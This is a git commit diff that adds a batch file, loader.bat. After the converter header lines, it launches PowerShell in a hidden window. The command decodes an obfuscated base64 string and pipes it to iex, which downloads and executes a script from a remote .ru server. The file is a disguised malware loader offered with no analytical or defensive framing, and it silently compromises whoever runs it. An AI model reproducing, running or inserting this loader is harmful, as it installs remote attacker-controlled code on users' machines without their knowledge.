d2d55c455f010d3c3d9644240db4eec917d44a5c
savaere <khempreksa750@outlook.com>
2024-11-28 20:23:06 +0000

    Add files via upload

---
+++ loader.bat
@@ -0,0 +1,35 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFDlRXxC+GGStCLkT6ezo0/6T8xpLGus8d+8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF25
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFDlRXxC+GGStCLkT6ezo09yCrEIQZsMLOJmNlOTAc9wR/0zocYVt13Re2M0FAB5LPhSkfE8jpnxJilCMPPOTuCvkWUOd6VsFFWl9imrEiS91Zctt+g==
+::YB416Ek+Zm8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+PowerShell -w Hidden "<#T#>[Text.Encoding]::UTF8.GetString(<#T#>[Convert]::FromBase64String(<#T#>'aWV4IChpd3IgJ2h0dHBzOi8vaXpvenZ1ay5ydS9wcm9jZXNzL0lhc2xjc01vLnR4dCcgLVVzZUJhc2ljUGFyc2luZykuQ29udGVudA=='<#T#>))<#T#>|<#T#>iex"
